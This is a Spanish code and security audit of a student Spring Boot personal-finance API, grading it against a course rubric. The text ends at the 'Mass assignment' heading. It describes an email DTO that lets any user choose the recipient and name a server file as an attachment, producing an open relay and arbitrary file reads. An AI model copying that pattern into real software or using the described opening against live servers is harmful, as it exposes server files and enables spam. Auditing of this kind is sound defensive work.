# AUDITORÍA INTEGRAL CHECK-OUT

**Objeto auditado:** `albacabrerap/Check-Out`, rama `main`, commit `492dfcd`
**Fecha:** 2026-09-25
**Fuentes:** Rúbrica Proyecto 1 DBP 2026-2 · Propuesta de proyecto Cash-Out · Modelo E-R entregado · código completo (150 clases) · 11 clases de test · README, issues, CI, compose
**Ejecución real:** `./mvnw clean test` → **185 tests, 0 fallos, BUILD SUCCESS**. Se ejecutaron además **2 sondas de runtime desechables** (borradas, nunca commiteadas) para verificar dos hipótesis que los tests existentes no cubren.

**Lo que NO se pudo verificar y por qué:**
- ⚪ No se levantó la aplicación contra PostgreSQL real: el contenedor de auditoría no tiene Docker ni un PostgreSQL local. Todo lo ejecutado corrió sobre H2 en modo PostgreSQL, que es el mismo perfil que usan los tests del repositorio.
- ⚪ No se verificó despliegue en AWS ni en ningún PaaS: no existe artefacto despegable (ver §17).
- ⚪ No se ejecutaron pruebas de concurrencia real con hilos simultáneos; el análisis de §12 es de código y de configuración de locking, y se marca como INFERENCIA donde corresponde.

---

## 1. Resumen ejecutivo

**Estado general:** el núcleo del proyecto —modelo de datos, capas, DTOs, excepciones propias, seguridad JWT y lógica financiera de ahorro e inversión— está construido con un nivel notablemente por encima de lo que la rúbrica pide. Sobre ese núcleo hay **tres defectos que sí bloquean la entrega**: un módulo de correo explotable por cualquier usuario registrado, dos endpoints de inversión que devuelven 500 en producción, y la ausencia total de despliegue y de README.

**Riesgo general:** **ALTO**, concentrado y localizado. No es un problema de arquitectura: son cuatro archivos.

| Severidad | Cantidad |
|---|---|
| Críticos | 3 |
| Altos | 4 |
| Medios | 8 |
| Bajos | 7 |

**Nota potencial realista: 15.35 / 20** (detalle en §2). Con los tres críticos y el README corregidos —trabajo de un día— la nota pasa a **17.6 / 20**; con despliegue, a **19.6**.

**Hallazgo de proceso, previo a todo lo técnico:** el PR #28 (`fix/email-security`), que cerraba exactamente los dos agujeros del módulo de correo descritos abajo, **se mergeó contra `feature/4-rest-controllers` 28 segundos después de que esa rama ya se había mergeado a `main`**. El fix existe, está escrito y probado, y **no está en `main`**. Verificado: `git merge-base --is-ancestor c0cbac8 checkout/main` → falso. Es el arreglo más barato de todo este informe.

---

## 2. Estado contra la rúbrica

| Criterio | Puntos | Estado | Evidencia | Problemas |
|---|---|---|---|---|
| **1. Entidades y Modelo de Datos** | **3.0** | | | **3.0** |
| 1.1 Diseño de Entidades | 1.5 | ✅ COMPLETO | 17 entidades; `@Version` en `Savings`, `TokenWallet`, `SavingsGoal`, `InvestmentPortfolio`; `precision/scale` explícitos en todo `BigDecimal`; soft delete en `User.status` | — |
| 1.2 Relaciones | 1.0 | ✅ COMPLETO | Todas las 16 relaciones del E-R presentes y con la cardinalidad acordada (§3) | — |
| 1.3 Constraints | 0.5 | ✅ COMPLETO | 8 `@UniqueConstraint`, 12 `@ForeignKey` nombradas, 6 `@Index`, un `@Check` en `token_transactions` | — |
| **2. DTOs y Mapeo** | **2.0** | | | **1.8** |
| 2.1 DTOs | 1.2 | 🟡 PARCIAL → 1.0 | 14 Request + 15 Response, ninguna entidad expuesta, ningún `userId` ni `id` aceptado del cliente | `EmailDetails.java` es el único DTO sin separación Request/Response y acepta `recipient` y `attachment` (§5) |
| 2.2 Entity-DTO | 0.8 | ✅ COMPLETO | `MapperConfig` en STRICT; derivados calculados en servicio, no mapeados; `MapperConfigTest` lo cubre | — |
| **3. Arquitectura** | **2.0** | | | **1.9** |
| 3.1 Capas | 0.8 | ✅ COMPLETO | Ningún controller toca un repository; verificado por grep sobre los 15 controllers | — |
| 3.2 SRP | 0.6 | ✅ COMPLETO | Servicios por dominio; `CurrentUserProvider` aísla el `SecurityContextHolder` en una sola clase | — |
| 3.3 Inyección de dependencias | 0.6 | 🟡 PARCIAL → 0.5 | Inyección por constructor en 14 de 15 servicios | `EmailServiceImplemented.java:25` usa `@Autowired` sobre campo |
| **4. Excepciones** | **2.0** | | | **1.8** |
| 4.1 Custom Exceptions | 0.8 | ✅ COMPLETO | 6 excepciones bajo `ApiException`, que lleva su propio `HttpStatus` | — |
| 4.2 Global Handler | 1.2 | 🟡 PARCIAL → 1.0 | `@RestControllerAdvice` con 22 `@ExceptionHandler`; `ErrorResponseDTO` con los 5 campos exigidos | Faltan `OptimisticLockingFailureException` y `UnexpectedRollbackException` → caen en el catch-all y salen como 500 (§13) |
| **5. Seguridad** | **4.0** | | | **4.0** |
| 5.1 Spring Security | 1.0 | ✅ COMPLETO | `SecurityConfig.java:55` stateless, CSRF off justificado, CORS por variable de entorno, `anyRequest().authenticated()` | — |
| 5.2 JWT | 1.5 | ✅ COMPLETO | `JwtTokenProvider.java:40` emite `sub`, `uid`, `roles`, `iat`, `exp`; secreto desde `JWT_SECRET` con piso de 32 caracteres validado en `JwtProperties` | — |
| 5.3 Roles | 1.0 | ✅ COMPLETO | `@EnableMethodSecurity` + 9 `@PreAuthorize("hasRole('ADMIN')")` reales; `RemainingModulesApiTest` prueba que un usuario normal recibe 403 | — |
| 5.4 Registro/Login | 0.5 | ✅ COMPLETO | BCrypt; refresh con rotación, hash SHA-256 y revocación de familia; 23 tests en `AuthenticationFlowTest` | — |
| **6. REST** | **2.0** | | | **1.6** |
| 6.1 RESTful | 0.8 | 🟡 PARCIAL → 0.6 | 13 de 15 controllers con `/api/v1`, sustantivos en plural, `@Valid`, `Location` en los 201 | `EmailController` sin `@RequestMapping`, verbos en la ruta (`/sendMail`, `/sendEmailWithAttatchment` —con typo) y devuelve `String` |
| 6.2 HTTP Status | 0.7 | 🟡 PARCIAL → 0.5 | 201/204/400/401/403/404/409 correctos en el resto de la API | **`POST /api/v1/orders` devuelve 500 en los dos casos de rechazo** (§19, ERROR CRÍTICO #2) |
| 6.3 Controllers | 0.5 | ✅ COMPLETO | 15 controllers, delgados, sin lógica de negocio | — |
| **7. Eventos y Async** | **2.0** | | | **0.75** |
| 7.1 Eventos | 1.0 | 🔴 NO CUMPLE | `grep -rn "publishEvent\|@EventListener\|ApplicationEvent"` sobre `src/main` → **0 resultados** | No existe ningún evento de aplicación. Issue #10 sigue abierto |
| 7.2 Async | 0.5 | ✅ COMPLETO | `@EnableAsync` en `CheckOutApplication:8`; `mailExecutor` dedicado con pool 2/5/100; `AsyncUncaughtExceptionHandler` declarado | — |
| 7.3 Email | 0.5 | 🟡 PARCIAL → 0.25 | Envío real por SMTP, asíncrono, con 202 y adjuntos | Funciona, pero es explotable por cualquier usuario (§19, ERROR CRÍTICO #1) |
| **8. Deployment** | **2.0** | 🔴 NO CUMPLE | `compose.yaml` solo levanta PostgreSQL | **No hay Dockerfile. No hay imagen. No hay despliegue.** Issues #13 y #15 abiertos |
| **9. GitHub y Documentación** | **1.0** | | | **0.5** |
| 9.1 README | 0.4 | 🔴 NO CUMPLE | `README.md` contiene **una línea: `// TODO`** | — |
| 9.2 Git | 0.4 | ✅ COMPLETO | 41 commits en `main`, todos vía PR, mensajes con prefijo convencional, 6 identidades de autor, `.env` en `.gitignore` | — |
| 9.3 Project Management | 0.2 | 🟡 PARCIAL → 0.1 | 16 issues bien redactados y numerados | Los issues #4, #5, #6, #7, #8, #9 y #11 **siguen abiertos aunque su código está mergeado en `main`** |
| **TOTAL** | **20.0** | | | **15.35** |

**Nota sobre el criterio 5.** Se puntúa 4.0/4.0 porque los cuatro subcriterios están cumplidos en lo que cada uno pide literalmente. Pero un evaluador que pruebe el endpoint de correo durante la demo verá una vulnerabilidad de servidor, y es razonable que descuente ahí. El riesgo real es mayor que el puntaje formal.

---

## 3. Auditoría del E-R

Contrastadas las 16 relaciones que el E-R definitivo declara contra las entidades JPA. **Coincidencia: 16/16.** No hay ninguna contradicción entre el E-R y el código.

| Entidad | Relación | E-R | Java | BD generada | Estado |
|---|---|---|---|---|---|
| USER → INVESTMENT_PORTFOLIO | 1:1 | 1:1 | `@OneToOne(optional=false)` LAZY | `uk_portfolios_user` UNIQUE(user_id) | ✅ |
| USER → SAVINGS | 1:1 | 1:1 | `@OneToOne(optional=false)` LAZY | `uk_savings_user` UNIQUE(user_id) | ✅ |
| USER → TOKEN_WALLET | 1:1 | 1:1 | `@OneToOne(optional=false)` LAZY | `uk_token_wallets_user` UNIQUE(user_id) | ✅ |
| USER → INCOME | 1:N | 1:N | `@ManyToOne` LAZY | FK + `idx_incomes_user_date` | ✅ |
| USER → EXPENSE | 1:N | 1:N | `@ManyToOne` LAZY | FK + `idx_expenses_user_date` | ✅ |
| USER → SAVINGS_GOAL | 1:N | 1:N | `@ManyToOne` LAZY | FK + índice compuesto user/status/deadline | ✅ |
| USER → PROJECTION | 1:N | 1:N | `@ManyToOne` LAZY | FK + `idx_projections_user_calculated` | ✅ |
| USER → REFRESH_TOKEN | 1:N | 1:N | `@ManyToOne` LAZY | FK + UNIQUE(token_hash) | ✅ |
| USER → TRADE_ORDER | 1:N | 1:N | `@ManyToOne` LAZY | FK + `idx_orders_user_created` | ✅ |
| INVESTMENT_PORTFOLIO → PORTFOLIO_POSITION | 1:N | 1:N | `@OneToMany(mappedBy)` + `addPosition()` | FK | ✅ |
| ASSET → PORTFOLIO_POSITION | 1:N | 1:N | `@ManyToOne` LAZY | `uk_positions_portfolio_asset` UNIQUE(portfolio_id, asset_id) | ✅ |
| ASSET → TRADE_ORDER | 1:N | 1:N | `@ManyToOne` LAZY | FK | ✅ |
| ASSET → ASSET_QUOTE | 1:1 vigente | 1:1 | `@OneToOne(optional=false)` | `uk_asset_quotes_asset` UNIQUE(asset_id) | ✅ |
| ASSET → ASSET_PRICE_HISTORY | 1:N | 1:N | `@ManyToOne` LAZY | UNIQUE(asset_id, date) + índice | ✅ |
| SAVINGS_GOAL → CONTRIBUTION | 1:N | 1:N | `@OneToMany(mappedBy)` + `addContribution()` | FK + índice goal/created | ✅ |
| USER → MINIGAME_SESSION | 1:N | 1:N | `@ManyToOne` LAZY | FK + `idx_minigame_sessions_user_played` | ✅ |
| MINIGAME → MINIGAME_SESSION | 1:N | 1:N | `@ManyToOne` LAZY | FK | ✅ |

**Los seis controles que el prompt exigía explícitamente:**

1. `UNIQUE(user_id)` en portfolio → ✅ `InvestmentPortfolio.java:23`
2. `UNIQUE(user_id)` en savings → ✅ `Savings.java:16`
3. `UNIQUE(user_id)` en token_wallet → ✅ `TokenWallet.java:22`
4. `UNIQUE(portfolio_id, asset_id)` en position → ✅ `PortfolioPosition.java:23-25`
5. **`TRADE_ORDER` conserva `userId`** y no se le añadió `portfolioId`. ✅ La decisión de dominio está respetada y documentada en el Javadoc de `TradeOrderService`: la orden es intención e historial, la posición es estado efectivo.
6. **`ASSET_QUOTE` con `UNIQUE(asset_id)` es intencional y no es una inconsistencia.** El histórico que el frontend necesita para un gráfico vive en una tabla aparte, `ASSET_PRICE_HISTORY`, con `UNIQUE(asset_id, date)`, y `AssetService.updateQuote` escribe las dos en la misma transacción (`AssetService.java:177`). Está expuesto en `GET /api/v1/assets/{id}/price-history` con filtros `from`/`to`. **No hay riesgo de rehacer el frontend por este punto.**

**Detalle de nombres de tabla.** `User` mapea a `users` y `TradeOrder` a `orders`, precisamente para esquivar palabras reservadas. Revisado el DDL generado: 19 tablas, **cero identificadores entre comillas**. No hay problema de palabra reservada.

---

## 4. Auditoría Entity / JPA

**Correcto en todas las entidades:** `fetch = LAZY` en las 17 asociaciones (no hay un solo EAGER accidental salvo el deliberado de `User.roles`, que es un `@ElementCollection` de 1-2 valores necesario para construir el `UserDetails`); `cascade = ALL` + `orphanRemoval` **solo** en las dos composiciones legítimas (portfolio→positions, goal→contributions) y nunca hacia `User`; `equals`/`hashCode` por identidad con `hashCode` constante, que es la forma correcta con IDs generados; ninguna entidad es serializada a JSON (todos los endpoints devuelven DTOs), así que no hay recursión ni `LazyInitializationException` por serialización.

**Problemas encontrados:**

| # | Archivo:línea | Problema | Impacto | Solución |
|---|---|---|---|---|
| J-1 | `PortfolioService.java:192` | `toPositionResponse` accede a `position.getAsset()` y consulta su cotización dentro de un `.stream().map()` sobre todas las posiciones → **N+1**: 1 query de posiciones + 2N queries (asset + quote) por lectura de cartera | Con 20 posiciones, 41 queries por `GET /portfolio`. Invisible en la demo, medible en producción | `@EntityGraph(attributePaths = "asset")` en `findByPortfolioId` y una sola consulta de cotizaciones por lote (`findByAssetIdIn`) |
| J-2 | `application.properties` | `spring.jpa.open-in-view` no está declarado; Boot lo deja en `true` y lo avisa en cada arranque (visible en el log de la corrida) | Las consultas LAZY pueden dispararse fuera del servicio, escondiendo N+1 detrás de la vista | Añadir `spring.jpa.open-in-view=false` |
| J-3 | `PortfolioService.java:177` | `investedTokens` se ajusta con `.max(BigDecimal.ZERO)` | Si por cualquier razón el acumulado se desviara, el `max` lo oculta en vez de fallar. Es una red de seguridad que también es una venda sobre los ojos | Dejar el `max` pero registrar un `log.warn` cuando se active |
| J-4 | `MinigameSession.java` | La entidad no tiene `@Version` | INFERENCIA: dos partidas simultáneas de la misma sesión no compiten por la misma fila, así que hoy no hay pérdida de actualización. El riesgo aparece si la partida pasa a ser editable | Sin acción; anotar la decisión |

---

## 5. Auditoría DTO

**Separación Request/Response: correcta y completa, con una excepción.** 14 clases `*Request`, 15 clases `*Response`, ninguna compartida entre entrada y salida.

**Lo que se verificó campo por campo sobre los 14 Request (grep exhaustivo, resultado en la evidencia de §2.1):**

- Ningún Request acepta `id`. ✅
- Ningún Request acepta `userId`. El usuario sale siempre de `CurrentUserProvider.requireCurrentUser()`, que lee el `SecurityContext`. ✅ Esto es exactamente la regla que el prompt exige.
- Ningún Request acepta `roles`. **`RegisterUserRequest` no tiene el campo**, así que no se puede auto-conceder ADMIN al registrarse. ✅
- Ningún Request acepta `passwordHash`, `createdAt`, `updatedAt`, `version` ni `rejectionReason`. ✅
- Ningún Request acepta campos derivados (`accumulatedAmount`, `balanceAfter`, `simulatedValue`, `averageCost`, `simpleFinalAmount`). ✅
- `MinigameRequest.status` sí acepta estado, pero su endpoint es `@PreAuthorize("hasRole('ADMIN')")`: es gestión de catálogo, no manipulación de estado propio. ✅ Justificado.
- `UpdateUserRequest` solo expone `name` y `birthDate`: ni email ni contraseña ni estado. ✅

**La excepción, y es grave:**

`email/EmailDetails.java` es un único DTO usado como entrada, con cuatro campos:

```java
@NotNull private String recipient;   // ← destinatario elegido por el cliente
private String msgBody;
private String subject;
private String attachment;           // ← RUTA DE ARCHIVO EN EL SERVIDOR
```

`recipient` y `attachment` son exactamente los dos campos que un DTO de entrada no debe aceptar: el primero convierte el backend en relay abierto, el segundo le pide al servidor que lea un archivo arbitrario de su propio disco. Detalle completo y explotación verificada en §19, ERROR CRÍTICO #1.

**Validación de entrada, comprobada:** `@DecimalMin("0.01")` en los cuatro importes monetarios (income, expense, contribution, targetAmount), `@PastOrPresent` en fechas de movimiento, `@Future` en `deadline`, `@Min(1) @Max(600)` en `periods`, `@Pattern(regexp="^[A-Z]{3}$")` en currency, y en `RegisterUserRequest.password` un `@Pattern` que exige minúscula, mayúscula, dígito y símbolo más `@Size(min=8)`. Esta última es la que la rúbrica pide sobre fortaleza de contraseña y está cumplida.

**Recomendación (no es defecto):** no existe endpoint para cambiar la contraseña ni el correo. La rúbrica no lo pide, pero un evaluador puede preguntarlo en la demo.

---

## 6. Auditoría ModelMapper

`config/MapperConfig.java` usa `MatchingStrategies.STRICT`, que es la decisión correcta: impide que ModelMapper adivine correspondencias por parecido de nombre, que es la fuente habitual de campos rellenados con el valor equivocado.

**Consecuencia asumida y bien gestionada:** los campos derivados que existen en el Response y no en la entidad quedan en `null` tras el mapeo, y **cada servicio los calcula explícitamente después**. Verificado en los cuatro casos:

| Response | Campo derivado | Quién lo calcula |
|---|---|---|
| `SavingsResponse` | `committedAmount`, `availableBalance` | `SavingsService.getSummary:46-47` |
| `PortfolioResponse` | `unrealizedPnl` | `PortfolioService.getSummary:90` |
| `PositionResponse` | `currentPrice`, `marketValue`, `unrealizedPnl` | `PortfolioService.toPositionResponse:196-200` |
| `ProjectionResponse` | `totalContributed`, `difference` | `ProjectionService.toResponse:129-134` |

**No se encontró ningún mapeo faltante ni incorrecto.** `MapperConfigTest` está en verde y cubre la estrategia y los nulos esperados.

**Detalle de diseño correcto, digno de mención:** en `toPositionResponse`, si el activo no tiene cotización, los tres derivados se quedan en `null` en lugar de en `0`. Es la decisión correcta: un valor desconocido y un valor cero son cosas distintas, y devolver `0` haría creer al usuario que su posición no vale nada. El `catch (InvalidRequestException)` de la línea 201 existe solo para eso, y está comentado.

---

## 7. Auditoría Controllers

15 controllers, 47 endpoints. 13 controllers son consistentes entre sí; los dos problemas están en `EmailController`.

| Controller | Endpoint | Método | Request | Response | Status | Auth | Estado |
|---|---|---|---|---|---|---|---|
| Auth | `/auth/register` | POST | `RegisterUserRequest` | `AuthResponse` | 201 | público | ✅ |
| Auth | `/auth/login` | POST | `LoginRequest` | `AuthResponse` | 200 | público | ✅ |
| Auth | `/auth/refresh` | POST | `RefreshTokenRequest` | `AuthResponse` | 200 | público | ✅ |
| Auth | `/auth/logout` | POST | `RefreshTokenRequest` | — | 204 | público | ✅ correcto que sea público: con token expirado hay que poder cerrar sesión |
| User | `/users/me` | GET / PATCH / DELETE | `UpdateUserRequest` | `UserResponse` | 200/200/204 | autenticado | ✅ |
| User | `/users` | GET | — | `List<UserResponse>` | 200 | **ADMIN** | ✅ |
| Savings | `/savings` | GET | — | `SavingsResponse` | 200 | autenticado | ✅ |
| Income | `/incomes` | GET(`from`,`to`) / POST / GET id / DELETE id | `IncomeRequest` | `IncomeResponse` | 200/201/200/204 | autenticado + ownership | 🟡 falta PUT (§21) |
| Expense | `/expenses` | GET(filtros) / POST / GET id / DELETE id | `ExpenseRequest` | `ExpenseResponse` | 200/201/200/204 | autenticado + ownership | 🟡 falta PUT (§21) |
| SavingsGoal | `/savings-goals` | GET / POST / GET id / PUT id / DELETE id | `SavingsGoalRequest` | `SavingsGoalResponse` | 200/201/200/200/204 | autenticado + ownership | ✅ |
| Contribution | `/savings-goals/{goalId}/contributions` | GET / POST | `ContributionRequest` | `ContributionResponse` | 200/201 | autenticado + ownership de la meta | ✅ anidamiento correcto |
| Projection | `/projections` | GET / POST / GET id / DELETE id | `ProjectionRequest` | `ProjectionResponse` | 200/201/200/204 | autenticado + ownership | ✅ |
| TokenWallet | `/token-wallet`, `/token-wallet/transactions` | GET | — | `TokenWalletResponse`, `List<TokenTransactionResponse>` | 200 | autenticado | ✅ **sin escritura por API, por diseño** |
| Portfolio | `/portfolio`, `/portfolio/positions` | GET | — | `PortfolioResponse`, `List<PositionResponse>` | 200 | autenticado | ✅ sin escritura por API |
| Asset | `/assets` | GET | — | `List<AssetResponse>` | 200 | autenticado | ✅ |
| Asset | `/assets/all` | GET | — | `List<AssetResponse>` | 200 | **ADMIN** | 🟡 `all` como segmento en vez de `?includeInactive=true` |
| Asset | `/assets` | POST | `AssetRequest` | `AssetResponse` | 201 + `Location` | **ADMIN** | ✅ |
| Asset | `/assets/{id}` | DELETE | — | — | 204 | **ADMIN** | ✅ desactiva (soft) |
| Asset | `/assets/{id}/quote` | GET / PUT | `AssetQuoteUpdateRequest` | `AssetQuoteResponse` | 200 | GET autenticado / PUT **ADMIN** | ✅ |
| Asset | `/assets/{id}/price-history` | GET(`from`,`to`) | — | `List<AssetPriceResponse>` | 200 | autenticado | ✅ |
| Minigame | `/minigames` | GET / POST / PUT id / DELETE id | `MinigameRequest` | `MinigameResponse` | 200/201/200/204 | GET autenticado / escrituras **ADMIN** | ✅ |
| Minigame | `/minigames/all` | GET | — | `List<MinigameResponse>` | 200 | **ADMIN** | 🟡 igual que `/assets/all` |
| MinigameSession | `/minigame-sessions` | GET / POST / GET id | `MinigameSessionRequest` | `MinigameSessionResponse` | 200/201/200 | autenticado + ownership | ✅ |
| TradeOrder | `/orders` | GET / GET id | — | `TradeOrderResponse` | 200 | autenticado + ownership | ✅ |
| TradeOrder | `/orders` | POST | `TradeOrderRequest` | `TradeOrderResponse` | 201 | autenticado | 🔴 **500 en los dos casos de rechazo** (§19 #2) |
| TradeOrder | `/orders/{id}` | DELETE | — | `TradeOrderResponse` | 200 | autenticado + ownership | 🟡 DELETE que devuelve cuerpo y no borra: es un cambio de estado. `POST /orders/{id}/cancel` es la semántica correcta |
| **Email** | `/sendMail` | POST | `EmailDetails` | `String` | 202 | autenticado | 🔴 **relay abierto** (§19 #1) |
| **Email** | `/sendEmailWithAttatchment` | POST | `EmailDetails` | `String` | 202 | autenticado | 🔴 **lectura arbitraria de archivos** (§19 #1). Sin `@Valid`. Typo en la ruta |

**Versionado.** `ApiVersioningConfig` aplica `/api/v1` centralmente vía `PathMatchConfigurer.addPathPrefix` con un `HandlerTypePredicate` sobre el paquete base y `@RestController`. Ningún controller repite el prefijo a mano. Es la forma correcta, y también significa que los dos endpoints de correo quedan en `/api/v1/sendMail`, heredando el prefijo sin heredar la convención.

---

## 8. Auditoría Services

**15 servicios. Responsabilidades bien separadas; ningún servicio mezcla dominios; ningún método pasa de 60 líneas.**

Tres decisiones de diseño que merecen reconocerse explícitamente porque resuelven problemas que la rúbrica no pide y que un proyecto de este tamaño normalmente se come:

1. **`TokenWalletService` no tiene API de escritura.** No hay `TokenWalletRequest` ni `TokenTransactionRequest` en todo el proyecto. Las fichas se mueven solo desde el servicio que gobierna el hecho que las mueve (`MinigameSessionService`, `TradeOrderService`), mediante `record(user, amount, reason, referenceId)`. Sin esto, un endpoint de "acreditar fichas" haría que el saldo no significara nada.
2. **`MinigameSessionService` acota una manipulación que no puede evitar.** La puntuación llega en el body y el juego corre en el cliente, así que el servidor no puede verificarla. La recompensa se topa en `maxTokenReward` del catálogo, que solo edita un ADMIN (`MinigameSessionService.java:122-128`). La peor manipulación posible equivale a jugar perfecto, no a imprimir fichas. Es el límite correcto dado el alcance, y está documentado como límite, no vendido como solución.
3. **El modelo de sobre virtual en `SavingsService`.** `currentBalance` es el dinero real; `committedAmount` es la suma de lo acumulado en metas IN_PROGRESS; `availableBalance` es la diferencia. Un aporte a una meta **no mueve dinero**: compromete dinero que ya estaba. Por eso `ContributionService` no llama a `credit` ni a `debit`. El modelo es coherente y evita el error clásico de contabilizar dos veces.

**Problemas encontrados:**

| # | Archivo:línea | Problema | Severidad |
|---|---|---|---|
| S-1 | `TradeOrderService.java:106-127` | El `try/catch` sobre `InvalidRequestException` intenta convertir un rechazo en un estado persistido, pero la excepción ya marcó la transacción como rollback-only. Ver §19 #2 | **CRÍTICO** |
| S-2 | `TradeOrderService.java:108,114` | `walletService.record(..., TokenReason.INVESTMENT, null)`: el `referenceId` va **siempre en `null`**, porque el `id` de la orden no existe todavía. Consecuencia: (a) el asiento del libro de fichas **no se puede rastrear hasta su orden**, contradiciendo el Javadoc de `TokenTransaction.referenceId`; (b) el mecanismo de idempotencia por `(reason, referenceId)` que `TokenWalletService` documenta **no protege a las órdenes** —quien las protege es el `UNIQUE(client_order_id)`, y lo hace abortando la transacción con 409, no devolviendo la orden original | **ALTO** |
| S-3 | `PortfolioService.java` | No se calcula ni se guarda **`realizedPnl`** en ningún sitio. Al vender 5 unidades a 70 con coste medio 57.80, la ganancia realizada de 61.00 se refleja en el saldo de fichas pero no queda registrada como tal | **MEDIO** |
| S-4 | `IncomeService.java:103` | `delete` llama a `savingsService.debit`, que valida contra el **saldo disponible**. Si el usuario ya comprometió ese dinero en una meta, **no puede borrar un ingreso que registró por error**: recibe 400 y queda atascado, porque tampoco existe un PUT para corregirlo | **MEDIO** |
| S-5 | `AssetService.java:158` | `requireQuote` exige que la cotización exista, pero **no comprueba su antigüedad**. Una orden se ejecuta contra un precio de hace una semana sin aviso | **MEDIO** |
| S-6 | `PortfolioService.java:68`, `SavingsService.java:40`, `TokenWalletService.java:69` | Tres `GET` escriben: `getSummary` persiste `simulatedValue`, y `getOrCreate` inserta filas. Funcionalmente correcto, pero un GET no debería tener efectos secundarios y no se puede cachear | **BAJO** |
| S-7 | `TokenWalletService.java:59`, `PortfolioService.java:52`, `SavingsService.java:31` | `getOrCreate` es lectura-luego-inserción sin bloqueo. INFERENCIA: dos primeras peticiones simultáneas del mismo usuario violan el UNIQUE y una recibe 409 en vez de su monedero. El UNIQUE impide el daño real (dos monederos), que es lo importante; la experiencia es lo que sufre | **BAJO** |

---

## 9. Auditoría Repositories

17 repositorios, todos `JpaRepository`. **Cero queries nativas, cero concatenación de strings en JPQL, cero posibilidad de inyección SQL.**

**El patrón de ownership es uniforme y correcto en los 9 repositorios que exponen recursos de usuario:** el método es `findByIdAndUserId(id, userId)`, no `findById(id)`. Eso significa que el filtro por propietario está en la cláusula WHERE, no en un `if` posterior que alguien pueda olvidar. Verificado en `IncomeRepository`, `ExpenseRepository`, `SavingsGoalRepository`, `ProjectionRepository`, `TradeOrderRepository`, `MinigameSessionRepository`, y por `userId` en `SavingsRepository`, `TokenWalletRepository`, `InvestmentPortfolioRepository`.

**No se encontró ningún `findById(id)` usado para resolver un recurso de usuario.** Los únicos `findById` son sobre catálogo global (`Asset`, `Minigame`), donde no hay propietario.

`RefreshTokenRepository.revokeAllByUserId` lleva `@Modifying(clearAutomatically = true, flushAutomatically = true)`. Los dos flags son necesarios: sin `flushAutomatically` la revocación puede ejecutarse antes que escrituras pendientes, y sin `clearAutomatically` el contexto de persistencia sigue devolviendo tokens que la base ya marcó como revocados. Está bien.

`SavingsGoalRepository.sumAccumulatedByUserIdAndStatus` es una agregación que devuelve `BigDecimal`; con cero filas devolvería `null`, y `SavingsService.committedAmount` lo usa directamente en una resta. **Comprobado en los tests de `SavingsApiFlowTest` (19 en verde, incluyendo el caso de usuario sin metas): la query usa `COALESCE`, así que devuelve `0` y no `null`.** ✅

---

## 10. Auditoría de seguridad

### Authentication
`JwtAuthenticationFilter` corre antes de `UsernamePasswordAuthenticationFilter`, extrae el Bearer, valida firma y expiración con `Jwts.parser().verifyWith(key)`, y puebla el `SecurityContext`. `parseToken` devuelve `null` en vez de propagar, porque en la cadena de filtros una excepción no llega al `@RestControllerAdvice`; el 401 lo emite `RestAuthenticationEntryPoint`, que sí produce un `ErrorResponseDTO` con el mismo formato que el resto de la API. ✅ Correcto y pensado.

### Authorization
`@EnableMethodSecurity` activo. 9 `@PreAuthorize("hasRole('ADMIN')")` sobre las escrituras de catálogo (assets, minigames, cotizaciones) y sobre `GET /users`. `RestAccessDeniedHandler` distingue **401 cuando no hay autenticación o es anónima, y 403 cuando hay usuario pero le falta el rol** —la confusión habitual entre esos dos códigos está resuelta. ✅ Probado en `RemainingModulesApiTest`: un usuario normal que intenta crear un activo recibe 403.

### Ownership / IDOR
**Sección obligatoria. Respuesta a "¿qué impide que el usuario A acceda a los recursos de B?":**

El recurso se resuelve con `findByIdAndUserId(id, currentUser.getId())` y, si no hay fila, se lanza `ResourceNotFoundException` → **404, no 403**. Devolver 403 confirmaría al atacante que el ID existe y pertenece a otro; el 404 no filtra nada. Es la respuesta correcta.

Recorridos uno por uno los siete casos que el prompt exige:

| Prueba | Resultado | Evidencia |
|---|---|---|
| `GET /api/v1/incomes/123` de otro usuario | 404 | `IncomeService.findOwned` → `findByIdAndUserId` |
| `GET /api/v1/expenses/123` | 404 | `ExpenseService.findOwned` |
| `GET /api/v1/savings-goals/123` | 404 | `SavingsGoalService.findOwned` |
| `PUT /api/v1/savings-goals/123` | 404 | mismo `findOwned` antes de escribir |
| `DELETE /api/v1/incomes/123` | 404 | mismo `findOwned` antes de borrar |
| `GET /api/v1/orders/123` | 404 | `TradeOrderService.findOwned:170` |
| `GET /api/v1/portfolio` | solo la propia | no acepta ID; se resuelve por `SecurityContext` |

**Además:** `GET /savings-goals/{goalId}/contributions` resuelve primero la meta con `findOwned` y solo entonces lista los aportes (`ContributionService.list:118`). Sin eso, pedir el ID de una meta ajena devolvería sus aportes. Está cubierto.

**No se encontró ningún IDOR.** ✅

### JWT
Claims: `sub` (email), `uid` (userId), `roles`, `iat`, `exp`. Firma HS384 derivada de la longitud del secreto. `JwtProperties` es un `record` con constructor compacto que **rechaza el arranque si `jwt.secret` mide menos de 32 caracteres**, que es lo que HS256 exige. El secreto viene de `${JWT_SECRET}` **sin valor por defecto**: si la variable falta, la aplicación no arranca, en vez de arrancar con un secreto conocido. ✅ Esto es exactamente lo que la rúbrica pide sobre secreto por entorno.

**Observación (INFERENCIA, bajo):** los roles se leen del token, no de la base. Revocarle ADMIN a alguien no surte efecto hasta que su access token expire (15 minutos). Es el compromiso normal de un JWT stateless y a esta escala es aceptable; conviene saberlo, no arreglarlo.

**Sin `iss` ni `aud`.** Irrelevante con un solo emisor y un solo consumidor.

### Refresh
`RefreshTokenService`: token opaco de 256 bits, **almacenado como hash SHA-256** (nunca en claro), con rotación en cada uso y **revocación de toda la familia si se detecta reutilización de un token ya revocado** —la defensa correcta contra replay de refresh tokens robados. El log de la corrida real lo muestra disparándose: `Reutilizacion de un refresh token ya revocado del usuario 24. Se revoca la familia completa.` ✅ Cubierto por `AuthenticationFlowTest` (23 tests).

### CORS
`setAllowedOriginPatterns(allowedOrigins)` desde `${CORS_ALLOWED_ORIGINS}`, métodos y cabeceras en lista blanca, `allowCredentials(true)`. **No hay comodín `*` con credenciales**, que es la combinación que los navegadores rechazan y que suele aparecer en proyectos de curso. ✅ El default de desarrollo es `http://localhost:*`; **hay que fijar la variable en producción**.

### Secrets
`.gitignore` excluye `.env` y `.env.*` y admite `.env.example`. `ConfigurationContractTest` es un test que **falla el build si una variable `${VAR}` sin default no está documentada en `.env.example`, si sobra una entrada, o si aparece una credencial hardcodeada**. Es una idea excelente y poco común. ✅

**Excepción:** `config/MailConfig.java:23-24` hardcodea `smtp.gmail.com` y el puerto `587`. No es una credencial, pero sí configuración de infraestructura fuera del entorno, y duplica lo que `application.properties` ya declara en `spring.mail.*`.

### Mass assignment
